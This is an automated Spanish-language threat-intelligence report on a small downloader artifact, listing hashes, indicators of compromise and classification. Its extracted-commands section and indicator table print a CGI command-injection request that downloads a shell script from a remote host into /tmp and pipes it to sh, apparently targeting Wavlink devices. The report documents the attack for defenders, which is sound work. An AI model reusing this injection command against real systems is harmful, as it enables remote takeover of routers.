# 🧬 Payload Analysis

`385c8f857df27c67de5c3e2149e19e8b81dc006044506bb4276b2255f7b842f4`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 235 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `385c8f857df27c67de5c3e2149e19e8b81dc006044506bb4276b2255f7b842f4`
- **MD5:** `59eee8cb1c7ebeb44323e9399b121e21`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 235 B |
| Entropía | 5.06 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wavlink;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.175.XXX | static_analysis |
| command | GET /cgi-bin/;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wavlink;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh | strings |
| hash | 385c8f857df27c67de5c3e2149e19e8b81dc006044506bb4276b2255f7b842f4 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
